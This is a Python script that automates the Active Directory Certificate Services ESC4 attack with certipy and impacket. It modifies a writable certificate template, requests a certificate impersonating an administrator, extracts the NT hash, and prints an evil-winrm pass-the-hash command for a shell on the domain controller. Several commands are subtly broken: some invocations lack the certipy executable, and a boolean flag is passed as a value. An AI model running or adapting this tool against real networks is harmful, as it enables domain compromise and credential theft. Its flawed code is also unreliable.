import subprocess
import argparse
import re
import os


def retrieve_ECS1_power(args):
    """ESC1: Exploit a certificate template with write privileges."""
    print("[+] Modifying certificate template configuration to exploit ESC1...")

    # Build the certipy command
    command = [
        "template",
        "-username", args.username,
        "-password", args.password,
        "-template", args.template,
        "-save-old",
    ]

    if args.kerberos:
        print("[+] Kerberos authentication enabled. Requesting TGT...")
        username_parts = args.username.split('@')
        sub_command_getting_tgt = [
            "impacket-gettgt",
            f"{username_parts[1]}/{username_parts[0]}:{args.password}",
            "-dc-ip", args.dc_ip
        ]

        tgt_process = subprocess.Popen(sub_command_getting_tgt, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = tgt_process.communicate()

        if f"{args.username}.ccache" in stdout:
            print(f"[+] Retrieved TGT. Setting KRB5CCNAME={args.username}.ccache")
            os.environ["KRB5CCNAME"] = f"{args.username}.ccache"
        else:
            print("[!] Failed to retrieve TGT.")
            print(stderr)
            return 1

        command.append("-k")

    if args.ns:
        command.append("-ns")
        command.append(args.ns)

    update_template = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = update_template.communicate()

    print(stdout)
    if "[*] Successfully updated" in stdout:
        print("[+] Certificate template modified successfully.")
        return 0

    print(stderr)
    return 1


def request_certificate(args):
    """Request a certificate using certipy."""
    print("[*] Requesting a certificate...")

    req_command = [
        "certipy", "req",
        "-username", args.username,
        "-password", args.password,
        "-ca", args.ca,
        "-target", args.target,
        "-template", args.template,
        "-upn", args.upn,
        "-dns", args.dns,
    ]

    if args.kerberos:
        req_command.append("-k")
    if args.ns:
        req_command.append("-ns")
        req_command.append(args.ns)
    if args.scheme:
        req_command.append("-scheme")

    req_process = subprocess.Popen(req_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = req_process.communicate()

    print(stdout)
    print(stderr)

    pfx_file_match = re.search(r"Saved certificate and private key to '(.*?\.pfx)'", stdout)
    if not pfx_file_match:
        print("[!] Failed to locate the .pfx file in the request output.")
        return None

    pfx_file = pfx_file_match.group(1)
    print(f"[+] .pfx file located: {pfx_file}")
    return pfx_file


def authenticate_with_certificate(pfx_file, dc_ip, chose_identity=0):
    """Authenticate using the certificate."""
    print("[*] Authenticating with the certificate...")

    auth_command = ["certipy", "auth", "-pfx", pfx_file, "-dc-ip", dc_ip]
    auth_process = subprocess.Popen(auth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
    stdout, stderr = auth_process.communicate()

    if "Found multiple identifications in certificate" in stdout:
        print("[*] Multiple identities found. Selecting the first one...")
        auth_process = subprocess.Popen(auth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
        stdout, stderr = auth_process.communicate(input=f"{chose_identity}\n")

    print(stdout)
    print(stderr)

    nt_hash_match = re.search(r"Got NT hash for .*?: ([a-fA-F0-9]{32})", stdout)
    if nt_hash_match:
        nt_hash = nt_hash_match.group(1)
        print(f"[+] NT Hash: {nt_hash}")
        print(f"[>] Use 'evil-winrm -i {dc_ip} -H {nt_hash}' to get a shell.")
    else:
        print("[!] NT hash not found.")


def restore_config(args):
    """Restore the default certificate template configuration."""
    print("[*] Restoring default certificate template configuration...")

    command = [
        "template",
        "-u", args.username,
        "-p", args.password,
        "-template", args.template,
        "-configuration", f"{args.template}.json",
    ]

    if args.kerberos:
        command.append("-k")

    restore_template = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = restore_template.communicate()

    print(stdout)
    if "[*] Successfully updated" in stdout:
        print("[+] Default configuration restored.")
    else:
        print(stderr)


def run_certipy_esc4(args):
    """Run the Certipy ESC4 exploit automation."""
    print("[*] Running ESC4 attack chain automation")
    if retrieve_ECS1_power(args) == 0:
        pfx_file = request_certificate(args)
        if pfx_file:
            authenticate_with_certificate(pfx_file, args.dc_ip, args.chose_identity)
            restore_config(args)


def main():
    """Parse arguments and run the script."""
    parser = argparse.ArgumentParser(description="Automate Certipy ESC4")
    parser.add_argument("-u", "--username", required=True, help="Username (e.g., john@corp.local)")
    parser.add_argument("-p", "--password", required=True, help="Password (e.g., Passw0rd)")
    parser.add_argument("-c", "--ca", required=True, help="Certificate Authority (e.g., corp-DC-CA)")
    parser.add_argument("-t", "--target", required=True, help="Target CA hostname (e.g., ca.corp.local)")
    parser.add_argument("--template", required=True, help="Certificate template (e.g., ESC1-Test)")
    parser.add_argument("--upn", required=True, help="UPN (e.g., administrator@corp.local)")
    parser.add_argument("--dns", required=True, help="DNS (e.g., dc.corp.local)")
    parser.add_argument("--ns", action="store_true", help="Use name server for non-standard DNS resolution.")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP (e.g., 172.16.126.128)")
    parser.add_argument("--chose-identity", type=int, default=0, help="Identity to choose when multiple identifications are found.")
    parser.add_argument("--kerberos", action="store_true", help="Enable Kerberos authentication.")
    parser.add_argument("--scheme", action="store_true", help="Use LDAPS or LDAP (default is LDAPS).")

    args = parser.parse_args()
    run_certipy_esc4(args)


if __name__ == "__main__":
    main()
